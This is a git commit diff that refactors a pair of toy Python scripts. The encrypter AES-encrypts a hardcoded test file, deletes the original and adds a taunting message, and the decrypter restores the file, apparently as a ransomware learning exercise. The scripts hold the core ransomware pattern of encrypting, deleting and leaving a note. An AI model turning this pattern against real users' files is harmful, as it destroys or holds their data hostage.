f0bf8db36979eb98ff9e16be01db05f30bbfb0d7
Davi Ribeiro <davi.ribeiro@gria.io>
2025-01-28 12:53:20 -0300

    Create encrypt and decrypt functions

--- decrypter.py
+++ decrypter.py
@@ -1,22 +1,27 @@
 import os
 import pyaes
 
-## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
-file = open(file_name, "rb")
+file_name = 'teste.txt.ransomwaretroll'
+
+# open and read file
+file = open(file_name, 'rb')
 file_data = file.read()
 file.close()
 
-## chave para descriptografia
-key = b"testeransomwares"
+# define decrypt key
+key = b'testeransomwares'
 aes = pyaes.AESModeOfOperationCTR(key)
+
+# deccrypt file
 decrypt_data = aes.decrypt(file_data)
 
-## remover o arquivo criptografado
 os.remove(file_name)
 
-## criar o arquivo descriptografado
-new_file = "teste.txt"
-new_file = open(f'{new_file}', "wb")
+new_file = 'new_teste.txt'
+
+# save decrypt file
+new_file = open(f'{new_file}', 'wb')
+
 new_file.write(decrypt_data)
+
 new_file.close()
--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,30 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# open and read file
 
-## remover o arquivo
+file_name = 'teste.txt'
+
+with open(file_name, 'rb') as file:
+    file_data = file.read()
+
+# insert aditional message to file
+aditional_message = '\nObrigado pela contribuicao e mais cuidado com seus arquivos\n'
+file_data += aditional_message.encode()
+
+# remove original file
 os.remove(file_name)
 
-## chave de criptografia
-key = b"testeransomwares"
+
+# define encrypt key
+key = b'testeransomwares'
+
 aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
+# encrypt file
 crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+# save encrypted file
+new_file_name = file_name + '.ransomwaretroll'
+with open(new_file_name, 'wb') as new_file:
+    new_file.write(crypto_data)
